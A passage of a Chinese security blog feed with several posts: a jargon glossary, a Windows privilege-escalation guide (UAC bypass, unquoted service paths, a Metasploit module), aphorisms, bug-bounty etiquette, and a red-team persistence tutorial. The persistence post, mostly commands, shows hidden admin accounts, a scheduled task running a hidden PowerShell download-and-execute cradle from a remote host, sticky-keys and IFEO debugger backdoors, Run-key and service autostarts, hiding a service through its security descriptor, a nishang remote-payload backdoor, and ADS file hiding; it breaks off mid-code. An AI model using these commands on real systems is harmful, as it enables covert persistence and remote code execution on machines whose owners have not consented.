src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image126.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image127.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image128.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image129.png"></p><p>133.关于域管：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image130.png"></p><p>134.关于stager：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image131.png"></p><p>135.关于Sigma规则：</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image132.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image133.png"></p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image134.png"></p><p>举个例子</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image135.png"></p><p>136.关于NG：”NG”代表”Next Generation”，即”下一代”的意思。很多工具都会使用这种标识后缀，如V2rayNG</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image136.png"></p><p>137.关于k8s：”k8s”是对Kubernetes的常见简称。这个简写方式是通过将”ubernete”中的”ubern”替换为数字”8”来实现的。这种简写方式在技术社区中非常常见，用于减少输入和书写的复杂性。因此，”k8s”通常用来代指Kubernetes，特别是在命令行、脚本和技术讨论中经常被使用。</p><p><img src="/2023/11/19/%E4%BF%A1%E5%AE%89%E6%9C%AF%E8%AF%AD/image137.png"></p><ol start="138"><li></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>提权手法</title>
      <link href="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/"/>
      <url>/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>提权手法总览：</p><p><img src="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/1645420997-889076-image.png" alt="img"></p><h1 id="Windows提权"><a href="#Windows提权" class="headerlink" title="Windows提权"></a>Windows提权</h1><h2 id="1、ByPassUAC"><a href="#1、ByPassUAC" class="headerlink" title="1、ByPassUAC"></a>1、ByPassUAC</h2><p>说明：ByPassUAC 的方法一般有利用系统白名单程序、COM接口以及利用 Windows 自身漏洞等方式。常见工具有 PowerShell 版的 Yamabiko 和需要自己编译的 C 语言版的 UACME 等，UACME 目前已经支持了72 种 ByPassUAC 的方法。</p><p>UACME 项目地址：<a href="https://github.com/hfiref0x/UACME.git%E3%80%82%E5%85%8B%E9%9A%86">https://github.com/hfiref0x/UACME.git。克隆</a> UACME 项目到本地后，使用 Visual Studio&#x2F;MinGW进行编译，然后运行即可</p><pre class="line-numbers language-none"><code class="language-none">#例如以下命令，表示使用 UACME 里的第 62 个方法进行 ByPassUAC，执行成功后，就会直接弹出管理员窗口，没有弹窗提示Akagi.exe 62<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/1645421010-482508-image.png" alt="img"></p><h2 id="2、Windows错误配置"><a href="#2、Windows错误配置" class="headerlink" title="2、Windows错误配置"></a>2、Windows错误配置</h2><h3 id="可信任服务路径"><a href="#可信任服务路径" class="headerlink" title="可信任服务路径"></a>可信任服务路径</h3><p>说明：可信任服务路径 ( Trusted Service Paths ) 漏洞利用了 Windows 文件路径解析的特性，可信任服务路径指的是包含空格且没有引号的路径，比如像如下的路径：</p><pre class="line-numbers language-none"><code class="language-none">C:\Program Files\Common Files\WgpSec\TeamsSix.exe<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>可以看到这个路径中有两个空格，那么对于 Windows 来说，它会尝试找到与空格前名字相匹配的程序，然后执行它。以上面的 exe 文件路径为例，Windows 会依次尝试执行以下程序：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">C:\Program.exeC:\Program Files\Common.exeC:\Program Files\Common Files\WgpSec\TeamsSix.exe<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>由于 Windows 服务通常是以 SYSTEM 权限运行的，所以在系统找到空格前的程序并执行时，也将以 SYSTEM 权限运行这个程序。所以当我们把木马程序命名为 Program.exe ，然后放到 C 盘下，当上面的 TeamsSix.exe 程序重新执行时，系统就会执行我们的木马，如果这个程序是系统服务程序，那么就可以获取到对应程序的权限。</p><pre class="line-numbers language-none"><code class="language-none">#通过下面的命令来查找系统中存在可信任服务路径的程序wmic service get name,displayname,pathname,startmode|findstr &#x2F;i &quot;Auto&quot; |findstr &#x2F;i &#x2F;v &quot;C:\Windows\\&quot; |findstr&#x2F;i &#x2F;v &quot;&quot;&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/image-20231030231742942.png" alt="image-20231030231742942"></p><p>如下的例子，可以看到 C:\Program Files\OpenSSH\bin\cygrunsrv.exe 存在包含空格且没有引号的路径。</p><p><img src="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/1645421028-663071-image.png" alt="img"></p><p>使用MSF接收到该靶机的会话(反弹shell)后，可以直接使用MSF利用该漏洞，MSF版本中利用该漏洞的模块是unquoted_service_pat。利用该模块，就可以在存在可信任服务路径漏洞的环境下拿到对应程序所拥有的权限。</p><pre class="line-numbers language-none"><code class="language-none">use windows&#x2F;local&#x2F;unquoted_service_pathset session 1run<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/30/%E6%8F%90%E6%9D%83%E6%89%8B%E6%B3%95/1645421042-666334-image.png" alt="img"></p><h3 id="AlwaysInstallElevated"><a href="#AlwaysInstallElevated" class="headerlink" title="AlwaysInstallElevated"></a>AlwaysInstallElevated</h3>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一言</title>
      <link href="/2023/10/29/%E4%B8%80%E8%A8%80/"/>
      <url>/2023/10/29/%E4%B8%80%E8%A8%80/</url>
      
        <content type="html"><![CDATA[<ul><li><p>世界吻我以痛，要我报之以歌</p></li><li><p>大多数人想做医生，却极少人想扫地，这导致了垃圾到处都是</p></li><li><p>木偶拜托了操控它的丝线后究竟是自由了还是变成了废品</p></li><li><p>为什么人生病了是要吃药，世界病了却要吃人</p></li><li><p>小明压力太大连续喝酒死了，那杀死小明的是酒精还是过去</p></li><li><p>我明明看见大街上的人都有翅膀，为什么没有一个人站起来飞翔</p></li><li><p>怀念过去是不是在时间的长河里刻舟求剑，展望未来是不是在前行的路上望梅止渴，活在当下是不是一种见风使舵</p></li><li><p>小孩没有钱就只能回家，大人没有钱就无法回家</p></li><li><p>向禁欲的寺庙求姻缘，向不出门的方丈问人生</p></li><li><p>有目的地的人生才会迷路，我只是来世界散步</p></li><li><p>死亡，是不是也算脱离生命危险</p></li><li><p>如果每次苏醒意味着梦中的自己正死去，那现实里死去，会在梦中醒来吗</p></li><li><p>喝醉了酒，摇晃的是你，还是整个世界</p></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 哲学与思考 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透之常识</title>
      <link href="/2023/10/29/%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B8%B8%E8%AF%86/"/>
      <url>/2023/10/29/%E6%B8%97%E9%80%8F%E4%B9%8B%E5%B8%B8%E8%AF%86/</url>
      
        <content type="html"><![CDATA[<p>关于漏洞危害定级</p><ul><li>getshell、后台、影响业务——中&#x2F;高危</li><li>间接危害，如XSS——中&#x2F;低危【反射型XSS是低危】，SQL注入【大多数都在中危，少部分高危】</li></ul><br><p>挖洞的注意事项与常识：</p><ul><li>不要在插入数据的地方进行sql注入【比如注册框】</li><li>测试存储型xss的时候严禁弹窗(一些大型src会有相应的测试规范，如腾讯src)，推荐使用console.log()函数，再通过自己的另一个账号进行验证，提供截图证明【将xss的弹窗语句alert()换成控制台语句console.log()，这样就不会影响到业务，是优先选择】</li><li>对于盲xss，仅允许外带domain信息</li><li>所有xss测试，测试之后需删除插入数据，如不能删除，需在漏洞报告中备注插入点</li><li>文件上传漏洞，不要getshell，如果知道文件上传路径，可以print一些内容，如果存在即可说明漏洞</li><li>云服务器别反弹shell，必然会报警(云盾告警)，可以通过CF框架来执行命令，或者通过云控制台进行远程登陆</li><li>在一个内网中，如果有多台Linux和少量winserver，直接对winserver进行信息收集价值可能会更大，因为由于习惯问题，图形化的windows更方便用来管理资产</li><li>CF接管控制台会创建一个后门用户，在使用完后，记得取消接管，使用 cf console cancel命令即可取消接管，后门用户也会随之删除</li><li>专属src算授权，公益src基本都是未授权</li><li>四个准则：不脱库，不传马(phoinfo或者输出123)，不影响用户(不要把平台搞崩溃，越权和逻辑漏洞不要对正常用户下手)，SQL注入查询不超过10行【只要遵守就基本没事】</li></ul><br><p>快速挖洞：如果不是为了CNVD等0day证书，仅仅是为了挖src，可以考虑以下途径</p><ul><li><p>找CMS通杀漏洞【可以去漏洞库找CMS通杀漏洞。漏洞别人已经帮你测好了，你只需要验证，如果存在漏洞，直接写报告提交，不用费时间去慢慢测漏洞。如果没有漏洞，换一个站】</p><p>一些漏洞库：</p><ul><li><p>peiqi文库</p></li><li><p>白阁文库</p></li><li><p>cnvd官方</p></li></ul></li></ul><br><p>安全里面的核心技术：</p><ul><li>0day</li><li>C2武器库</li><li>自启动持久化</li><li>未公开的免杀</li><li>实战经验</li></ul><br><p>有价值的漏洞：</p><ul><li>证书站</li><li>专属企业src</li><li>重点单位机构</li></ul><br><p>优质文章与鸣谢：</p><ul><li>src完整流程案例：<a href="https://bbs.zkaq.cn/t/5893.html">https://bbs.zkaq.cn/t/5893.html</a></li><li>打穿云上内网的攻防实战案例：<a href="https://bbs.zkaq.cn/t/5893.html">https://bbs.zkaq.cn/t/5893.html</a></li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>权限维持手法</title>
      <link href="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/"/>
      <url>/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<p>在本文从Windows 主机后门、Windows 文件隐藏、域后门、Linux 后门、Linux 文件隐藏这五个方面讨论红队中的权限维持手法</p><p><img src="https://huoxian-community.oss-cn-beijing.aliyuncs.com/2022-01-24/1642995329-754146-image.png" alt="img"></p><p>[TOC]</p><h1 id="Windows主机后门"><a href="#Windows主机后门" class="headerlink" title="Windows主机后门"></a>Windows主机后门</h1><h2 id="1、隐藏账号"><a href="#1、隐藏账号" class="headerlink" title="1、隐藏账号"></a>1、隐藏账号</h2><pre class="line-numbers language-none"><code class="language-none">#这个是比较常见的创建后门的方法，直接建立一个隐藏账号#虽然使用 net user 是看不到这个账号的，但是在控制面板里可以看到，因此这种隐藏效果并不是很好net user teamssix$ Passw0rd &#x2F;addnet localgroup administrators teamssix$ &#x2F;add<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029121500510.png" alt="image-20231029121500510"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029121535128.png" alt="image-20231029121535128"></p><p>说明：想要更好的隐藏效果，可以通过注册表克隆用户实现，只是操作起来比较繁琐。teamssix师傅写的一个利用注册表创建隐藏用户的小工具可以快速实现这个功能【<a href="https://github.com/wgpsec/CreateHiddenAccount%E3%80%91">https://github.com/wgpsec/CreateHiddenAccount】</a></p><pre class="line-numbers language-none"><code class="language-none">#创建一个隐藏用户CreateHiddenAccount.exe -u teamssix -p Passw0rd#检查当前系统的隐藏账号CreateHiddenAccount.exe -c#删除用户CreateHiddenAccount.exe -d teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2、计划任务"><a href="#2、计划任务" class="headerlink" title="2、计划任务"></a>2、计划任务</h2><p>说明：计划任务也是比较常见的权限维持方法，计划任务在 Win7 之前使用 at 命令，之后的系统中使用 schtasks 命令</p><pre class="line-numbers language-none"><code class="language-none">#每小时执行一次calc.exeschtasks &#x2F;create &#x2F;tn updater &#x2F;tr calc.exe &#x2F;sc hourly &#x2F;mo 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029122454235.png" alt="image-20231029122454235"></p><pre class="line-numbers language-none"><code class="language-none">#当系统空闲时，执行 CS 上线 PowerShell 脚本schtasks &#x2F;create &#x2F;tn WindowsUpdate &#x2F;tr &quot;powershell.exe -nop -w hidden -c &#39;IEX ((new-object net.webclient).downloadstring(&#39;&#39;&#39;http:&#x2F;&#x2F;172.16.214.1:80&#x2F;a&#39;&#39;&#39;))&#39;&quot; &#x2F;sc onidle &#x2F;i 1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123133242.png" alt="image-20231029123133242"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123204176.png" alt="image-20231029123204176"></p><h2 id="3、shift后门"><a href="#3、shift后门" class="headerlink" title="3、shift后门"></a>3、shift后门</h2><pre class="line-numbers language-none"><code class="language-none">copy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe &#x2F;y<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123912764.png" alt="image-20231029123912764"></p><pre class="line-numbers language-none"><code class="language-none">#如果提示访问被拒绝，可以在管理员权限下，加上 everyone 的权限再试试cacls C:\Windows\System32\sethc.exe  &#x2F;T &#x2F;E &#x2F;G everyone:Fcopy C:\Windows\System32\cmd.exe C:\Windows\System32\sethc.exe &#x2F;y<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029123416073.png" alt="image-20231029123416073"></p><pre class="line-numbers language-none"><code class="language-none">#也可以使用注册表REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; &#x2F;v Debugger &#x2F;t REG_SZ &#x2F;d &quot;C:\windows\system32\cmd.exe&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>说明：在系统登录界面，按5下shift键就能打开cmd窗口，即粘滞键后门</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029125825458.png" alt="image-20231029125825458"></p><p>补充：除了使用按5下shift 打开粘滞键的功能外，同样的道理，还可以使用辅助工具、放大镜、屏幕键盘等等</p><pre class="line-numbers language-none"><code class="language-none">#这里演示使用辅助工具utilman.exeREG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141159902.png" alt="image-20231029141159902"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141321051.png" alt="image-20231029141321051"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995681-882230-image.png" alt="img"></p><pre class="line-numbers language-none"><code class="language-none">#演示使用屏幕键盘osk.exeREG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029141628319.png" alt="image-20231029141628319"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995698-111867-image.png" alt="img"></p><pre class="line-numbers language-none"><code class="language-none">#演示放大镜Magnify.exeREG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\Magnify.exe&quot; &#x2F;t REG_SZ &#x2F;v Debugger &#x2F;d &quot;C:\windows\system32\cmd.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029142221757.png" alt="image-20231029142221757"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029142234592.png" alt="image-20231029142234592"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995711-431791-image.png" alt="img"></p><h2 id="4、组策略"><a href="#4、组策略" class="headerlink" title="4、组策略"></a>4、组策略</h2><p>流程：</p><ol><li>新建一个 bat 文件，这里 bat 内容遵循cmd&#x2F;PowerShell语法，比如 calc</li><li>进入本地组策略<ul><li>终端中键入gpedit.msc</li><li>win+R键入gpedit.msc</li></ul></li><li>用户配置–&gt;Windows设置–&gt;脚本登录–&gt;选择 bat 文件【当用户登录时就会触发这个 bat 文件】</li></ol><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995722-703721-image.png" alt="img"></p><h2 id="5、注册表"><a href="#5、注册表" class="headerlink" title="5、注册表"></a>5、注册表</h2><p>说明：在系统启动的注册表下添加恶意程序，这样当用户登录系统时，exe 就会被运行，或者将 exe 直接放到系统启动的文件夹里也是一样的道理</p><pre class="line-numbers language-none"><code class="language-none">reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run &#x2F;v &quot;Vmware Regg&quot; &#x2F;t REG_SZ &#x2F;d &quot;C:\Windows\System32\calc.exe&quot; &#x2F;f<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143436820.png" alt="image-20231029143436820"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143510992.png" alt="image-20231029143510992"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995733-68515-image.png" alt="img"></p><h2 id="6、服务自启动"><a href="#6、服务自启动" class="headerlink" title="6、服务自启动"></a>6、服务自启动</h2><p>说明：直接使用命令创建服务</p><pre class="line-numbers language-none"><code class="language-none">sc create teamssix start&#x3D;auto binPath&#x3D;&quot;cmd.exe &#x2F;k ping -n 1 test.xxx.ceye.io&quot; obj&#x3D;Localsystem<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143646494.png" alt="image-20231029143646494"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143652136.png" alt="image-20231029143652136"></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029143704256.png" alt="image-20231029143704256"></p><pre class="line-numbers language-none"><code class="language-none">#启动该服务net start teamssix#可能会报错，但其实是被执行的<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995751-115259-image.png" alt="img"></p><p>注意：这种创建服务的方法隐藏性太弱，直接在服务里就能看到</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995769-935072-image.png" alt="img"></p><p>可以在创建完服务后，使用以下命令将创建的服务隐藏，这样不论是在服务中，还是使用命令都查不到这个服务，如下</p><pre class="line-numbers language-none"><code class="language-none">#隐藏服务sc.exe sdset teamssix &quot;D:(D;;DCLCWPDTSDCC;;;IU)(D;;DCLCWPDTSDCC;;;SU)(D;;DCLCWPDTSDCC;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995779-915667-image.png" alt="img"></p><pre class="line-numbers language-none"><code class="language-none">#可以使用以下命令恢复&amp; $env:SystemRoot\System32\sc.exe sdset teamssix &quot;D:(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLCSWLOCRRC;;;SU)S:(AU;FA;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="7、nishang后门"><a href="#7、nishang后门" class="headerlink" title="7、nishang后门"></a>7、nishang后门</h2><p>说明：nishang 是一个 PowerShell 项目，里面集成了众多工具，其中包含有制作后门的工具【<a href="https://github.com/samratashok/nishang%E3%80%91">https://github.com/samratashok/nishang】</a></p><h3 id="HTTP-Backdoor"><a href="#HTTP-Backdoor" class="headerlink" title="HTTP-Backdoor"></a>HTTP-Backdoor</h3><pre class="line-numbers language-none"><code class="language-none">cd nishang\BackdoorsImport-Module .\HTTP-Backdoor.ps1HTTP-Backdoor -CheckURL http:&#x2F;&#x2F;192.168.7.1&#x2F;1.txt -PayloadURL http:&#x2F;&#x2F;192.168.7.1&#x2F;calc.ps1 -MagicString start -StopString stop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/image-20231029150732405.png" alt="image-20231029150732405"></p><p><code>说明：该脚本会读取 CheckURL 的内容，这里设置的 MagicString 为 start，即当 http://192.168.7.1/1.txt 内容为 start 的时候，就会执行 http://192.168.7.1/calc.ps1 脚本</code></p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995787-819963-image.png" alt="img"></p><h3 id="Add-ScrnSaveBackdoor"><a href="#Add-ScrnSaveBackdoor" class="headerlink" title="Add-ScrnSaveBackdoor"></a>Add-ScrnSaveBackdoor</h3><p>说明：Add-ScrnSaveBackdoor 脚本可以帮助攻击者利用 Windows 的屏幕保护程序来安装一个隐藏的后门，该脚本需要管理员权限</p><pre class="line-numbers language-none"><code class="language-none">Import-Module .\Add-ScrnSaveBackdoor.ps1Add-ScrnSaveBackdoor -Payload &quot;Powershell.exe calc&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995798-424517-image.png" alt="img"></p><p>当屏幕保护程序启动时，就会运行 Payload 里的内容</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995806-737528-image.png" alt="img"></p><p>除了上面的两个脚本外，还有 Execute-OnTime 和 Invoke-ADSBackdoor。其中 Execute-OnTime 和 HTTP-Backdoor 脚本的使用方法相似，不过增加了定时启动脚本的功能。Windows 下的制作后门方法当然不止上面这些，还有其他的，比如进程注入、dll 劫持等等。</p><h1 id="Windows文件隐藏"><a href="#Windows文件隐藏" class="headerlink" title="Windows文件隐藏"></a>Windows文件隐藏</h1><h2 id="1、文件属性"><a href="#1、文件属性" class="headerlink" title="1、文件属性"></a>1、文件属性</h2><p>说明：文件右击属性，选择隐藏即可</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995815-443214-image.png" alt="img"></p><p>如果想显示文件，就在文件夹选择中选择「显示隐藏的文件、文件夹和驱动器」就行了</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995824-299239-image.png" alt="img"></p><p>也可以键入如下命令</p><pre class="line-numbers language-none"><code class="language-none">attrib +s +a +h +r <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995831-613157-image.png" alt="img"></p><h2 id="2、ADS"><a href="#2、ADS" class="headerlink" title="2、ADS"></a>2、ADS</h2><p>说明：ADS是NTFS磁盘格式的一个特性，在NTFS文件系统下，每个文件都可以存在多个数据流，创建一个数据交换流文件的方法很简单，命令为“宿主文件:准备与宿主文件关联的数据流文件”。</p><pre class="line-numbers language-none"><code class="language-none">echo teamssix &gt; CreateHiddenAccount_v0.2.exe:test.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>使用 dir 是看不到的，使用 dir &#x2F;r 才可以</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995857-995048-image.png" alt="img"></p><p>如果想编辑该文件，可以使用 notepad 进行编辑</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995865-198699-image.png" alt="img"></p><p>如果想执行 exe 文件，可以先创建一个快捷方式，再执行</p><pre class="line-numbers language-none"><code class="language-none">type evil.exe &gt; CreateHiddenAccount_v0.2.exe:evil.exe#需要管理员权限mklink &quot;C:\Users\test\Desktop\evillink.exe&quot; &quot;C:\Users\test\Desktop\CreateHiddenAccount_v0.2.exe:evil.exe&quot;start evil.exe#如果想删除这个隐藏文件，需要删除宿主文件才行<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="3、系统文件夹伪装"><a href="#3、系统文件夹伪装" class="headerlink" title="3、系统文件夹伪装"></a>3、系统文件夹伪装</h2><p>例如这里有一个 test 文件夹，将 test 命名为：我的电脑.{20D04FE0-3AEA-1069-A2D8-08002B30309D}，这时文件夹的图标就会变为「我的电脑」图标</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995875-275666-image.png" alt="img"></p><p>使用 dir 可以看到里面的文件，但如果点击这个文件夹，就会真的进入到「我的电脑」界面里</p><p><img src="/2023/10/28/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81%E6%89%8B%E6%B3%95/1642995882-883710-image.png" alt="img"></p><p>下面是一些其他的常用标识符</p><pre class="line-numbers language-none"><code 